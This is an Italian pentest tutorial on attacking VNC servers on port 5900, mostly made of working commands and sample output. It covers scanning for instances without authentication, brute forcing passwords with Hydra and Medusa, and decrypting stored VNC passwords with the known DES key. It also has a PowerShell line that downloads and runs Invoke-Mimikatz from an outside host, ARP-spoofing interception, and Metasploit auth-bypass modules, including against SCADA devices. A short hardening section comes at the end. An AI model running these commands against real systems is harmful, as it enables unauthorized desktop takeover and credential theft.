---
title: 'Porta 5900 VNC: No Auth, Brute Force e Desktop Remoto'
slug: porta-5900-vnc
description: >-
  Porta 5900 VNC nel pentest: accesso desktop remoto, istanze senza
  autenticazione, brute force password, screenshot e session hijacking.
image: /porta-5900-vnc.webp
draft: false
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - VNC
  - RFB
  - VNC Brute Force
featured: true
---

VNC (Virtual Network Computing) è un protocollo di condivisione desktop remoto che opera sulla porta 5900 TCP (display :0). A differenza di [RDP](https://hackita.it/articoli/porta-3389-rdp) che è nativo Windows, VNC è multipiattaforma — gira su Linux, Windows, macOS, embedded systems e dispositivi industriali. Nel penetration testing, VNC è un target ad alto valore per tre motivi: molte istanze girano **senza autenticazione** (accesso diretto al desktop), quelle con password usano un sistema di **hashing debole** (DES con chiave fissa, crackabile istantaneamente) e il protocollo trasmette in chiaro — qualsiasi password o dato visibile sullo schermo è intercettabile via sniffing. VNC è ovunque: server di produzione con accesso "di emergenza", macchine di sviluppo, sistemi SCADA/ICS, thin client e kiosk.

La porta 5900 corrisponde al display `:0`. Display aggiuntivi usano porte incrementali: `:1` = 5901, `:2` = 5902, e così via. Alcuni server VNC come RealVNC usano anche la porta 5800 per l'accesso via Java applet nel browser.

## Varianti VNC

| Software         | Piattaforma    | Note di sicurezza                                 |
| ---------------- | -------------- | ------------------------------------------------- |
| **TightVNC**     | Cross-platform | Password DES, nessuna cifratura                   |
| **RealVNC**      | Cross-platform | Versione Free senza cifratura, Enterprise con TLS |
| **TigerVNC**     | Linux          | Default nelle distro, cifratura opzionale         |
| **UltraVNC**     | Windows        | Plugin di cifratura separato                      |
| **x11vnc**       | Linux          | Spesso senza password su setup rapidi             |
| **LibVNCServer** | Embedded       | Comune in dispositivi IoT e SCADA                 |

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 5900-5910 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.8)
5901/tcp open  vnc     VNC (protocol 3.8)
```

Due display attivi — due sessioni desktop separate.

### Script Nmap

```bash
nmap -p 5900 --script=vnc-info,vnc-brute,vnc-title 10.10.10.40
```

```
PORT     STATE SERVICE
5900/tcp open  vnc
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     VNC Authentication (2)
|_    Tight (16)
| vnc-title:
|_  Desktop: root@prod-server-01:0
```

**Intelligence:**

* **Protocol 3.8** → versione standard, niente di speciale
* **Security type VNC Authentication (2)** → richiede password (ma debole — DES)
* **Security type None (1)** → se presente, **accesso senza password**
* **Desktop title** → `root@prod-server-01:0` → username e hostname esposti, sessione root

### Scansione rapida per VNC no-auth

```bash
# Nmap script che testa connessione senza password
nmap -p 5900 --script=vnc-info 10.10.10.40
```

Se `Security types` include `None (1)` → connettiti direttamente, nessuna password necessaria.

### Metasploit scanner

```bash
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 10.10.10.0/24
run
```

Scansiona un'intera subnet per VNC senza autenticazione — sorprendentemente comune.

## 2. Connessione Senza Autenticazione

Se VNC non richiede password:

```bash
vncviewer 10.10.10.40:5900
```

Desktop completo — mouse e tastiera funzionano. Sei dentro.

```bash
# Alternativa: con xfreerdp (supporta anche VNC)
xtigervncviewer 10.10.10.40:5900

# Da riga di comando senza GUI (screenshot)
vncsnapshot 10.10.10.40:0 screenshot.jpg
```

### Screenshot automatizzato (stealth)

```bash
# Cattura screenshot senza aprire una finestra — utile per non disturbare l'utente
# Con Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 10.10.10.40
set BLANK_PASSWORDS true
run

# Se login success, cattura screenshot
use post/multi/gather/vnc_screenshot
```

```bash
# Con nmap
nmap -p 5900 --script=vnc-title 10.10.10.40
# Il title mostra cosa c'è sullo schermo (es: "root@server - Terminal")
```

## 3. Brute Force Password

### Hydra

```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt 10.10.10.40 vnc
```

```
[5900][vnc] host: 10.10.10.40   password: s3cur3VNC
```

VNC non ha username — solo password. Hydra testa solo password.

### Medusa

```bash
medusa -h 10.10.10.40 -M vnc -P /usr/share/wordlists/common_vnc.txt
```

### Nmap brute

```bash
nmap -p 5900 --script=vnc-brute 10.10.10.40
```

### Password VNC comuni

```
password
123456
vnc
admin
test
letmein
(vuota)
1234
server
changeme
```

VNC ha un limite di **8 caratteri** sulla password (troncata silenziosamente). Questo rende il brute force molto rapido — lo spazio di ricerca è piccolo.

### Connessione con password trovata

```bash
vncviewer 10.10.10.40:5900 -passwd <(echo "s3cur3VNC" | vncpasswd -f)
```

## 4. Password Cracking — File .vnc e Registry

Le password VNC sono salvate localmente in formato DES con chiave fissa nota. Se hai accesso al filesystem:

### Linux

```bash
# File password VNC
cat ~/.vnc/passwd
# Output: bytes binari (DES encrypted)

# Anche in:
/etc/vnc/passwd
/root/.vnc/passwd
/home/*/.vnc/passwd
```

### Windows

```bash
# TightVNC (registry)
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
reg query "HKLM\SOFTWARE\TightVNC\Server" /v PasswordViewOnly

# RealVNC
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password

# UltraVNC
type "C:\Program Files\UltraVNC\ultravnc.ini" | findstr passwd
```

### Decrypt password VNC

La chiave DES è fissa e pubblica: `\x17\x52\x6b\x06\x23\x4e\x58\x07`. Il decrypt è istantaneo:

```bash
# Con vncpwd
vncpwd encrypted_password_hex

# Con Metasploit
irb
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt(["hex_password"].pack('H*'))
```

```python
# Python one-liner
from Crypto.Cipher import DES
key = b'\x17\x52\x6b\x06\x23\x4e\x58\x07'
cipher = DES.new(key, DES.MODE_ECB)
print(cipher.decrypt(bytes.fromhex("ENCRYPTED_HEX")).decode())
```

```bash
# Con msfconsole
use auxiliary/admin/vnc/realvnc_41_bypass
# oppure
use post/multi/gather/vnc_decrypt_hash
```

Non serve [Hashcat](https://hackita.it/articoli/hashcat) — il decrypt è deterministico (DES con chiave nota), non è un hash da crackare.

## 5. Post-Exploitation — Dal Desktop alla Shell

### Se sei su un desktop Linux

```
1. Apri un terminale (right-click → Terminal, o cerca nel menu)
2. Verifica chi sei: whoami, id
3. Se sei root → hai finito
4. Se non sei root → privilege escalation
```

```bash
# Da terminale sul desktop VNC
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/shadow  # se sei root
```

### Se sei su un desktop Windows

```
1. Apri cmd o PowerShell (Win+R → cmd)
2. whoami
3. Se sei Administrator o SYSTEM → Mimikatz
```

```powershell
# Scarica ed esegui Mimikatz
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.200/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
```

Per [Mimikatz completo](https://hackita.it/articoli/mimikatz) e [DCSync](https://hackita.it/articoli/dcsync).

### Keylogging via VNC

VNC riceve tutti gli eventi tastiera e mouse. Con accesso al desktop puoi:

* Osservare l'utente digitare password
* Osservare sessioni di admin su altri sistemi
* Leggere email, chat, documenti aperti

### Clipboard hijacking

```bash
# Il clipboard VNC è condiviso — puoi leggere cosa l'utente copia/incolla
# Spesso contiene password copiate da password manager
```

## 6. VNC su Dispositivi Embedded e SCADA

VNC è diffusissimo su sistemi industriali (SCADA, HMI, PLC con interfaccia grafica), thin client, kiosk e digital signage. Questi dispositivi:

* Quasi sempre senza password
* Firmware non aggiornabile
* Nessun logging
* Accesso diretto ai controlli del processo industriale

```bash
# Scansiona una subnet industriale per VNC
nmap -sV -p 5900-5910 192.168.100.0/24 --open
```

Un VNC aperto su un sistema SCADA dà accesso ai controlli fisici del processo. Finding critico.

## 7. CVE e Bypass Autenticazione

### CVE-2006-2369 — RealVNC Authentication Bypass

RealVNC 4.1.1: bypass completo dell'autenticazione. Il client invia un security type che il server non supporta ma accetta comunque:

```bash
use auxiliary/admin/vnc/realvnc_41_bypass
set RHOSTS 10.10.10.40
run
```

### CVE-2019-15806 — LibVNCServer auth bypass

Bypass autenticazione in LibVNCServer (usato in molti dispositivi embedded).

### CVE-2022-28708 — UltraVNC buffer overflow

Buffer overflow in UltraVNC → potenziale RCE pre-auth.

```bash
searchsploit vnc
searchsploit tightvnc
searchsploit ultravnc
searchsploit realvnc
searchsploit libvnc
```

## 8. Man-in-the-Middle

VNC trasmette in chiaro (tranne VeNCrypt e versioni Enterprise). Su una rete dove puoi fare ARP spoofing:

```bash
# ARP spoof per intercettare traffico VNC
arpspoof -i eth0 -t 10.10.10.40 10.10.10.1

# Cattura con Wireshark
wireshark -i eth0 -f "tcp port 5900"
```

Nel traffico intercettato:

* Password challenge/response (crackabile con la chiave DES nota)
* Aggiornamenti del framebuffer (ricostruzione dello schermo)
* Eventi tastiera (keystrokes in chiaro)

## 9. Detection & Hardening

* **Non esporre VNC su Internet** — mai, per nessun motivo
* **Password forte** — anche se VNC la tronca a 8 caratteri, usa i massimi 8 con complessità
* **VNC over SSH tunnel** — `ssh -L 5900:localhost:5900 user@server` poi `vncviewer localhost:5900`
* **VeNCrypt o VNC con TLS** — cifratura del traffico
* **Firewall** — porta 5900 solo da IP specifici
* **Timeout e lockout** — limita i tentativi falliti
* **Usa RDP o SSH invece di VNC** — protocolli più sicuri
* **Monitora** connessioni VNC in orari non lavorativi

## 10. Cheat Sheet Finale

| Azione              | Comando                                          |
| ------------------- | ------------------------------------------------ |
| Nmap                | `nmap -sV -p 5900-5910 --script=vnc-info target` |
| No-auth scan        | `use auxiliary/scanner/vnc/vnc_none_auth` (MSF)  |
| Connessione         | `vncviewer target:5900`                          |
| Screenshot          | `vncsnapshot target:0 screenshot.jpg`            |
| Brute force         | `hydra -s 5900 -P wordlist target vnc`           |
| Nmap brute          | `nmap -p 5900 --script=vnc-brute target`         |
| Decrypt pwd Linux   | `cat ~/.vnc/passwd` → `vncpwd hex`               |
| Decrypt pwd Windows | `reg query HKLM\...\TightVNC /v Password`        |
| RealVNC bypass      | `use auxiliary/admin/vnc/realvnc_41_bypass`      |
| Searchsploit        | `searchsploit vnc tightvnc ultravnc realvnc`     |

***

Riferimento: RFB Protocol specification, HackTricks VNC, OSCP methodology. Uso esclusivo in ambienti autorizzati.
[https://www.pentestpad.com/port-exploit/port-5900-vnc-virtual-network-computing](https://www.pentestpad.com/port-exploit/port-5900-vnc-virtual-network-computing)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
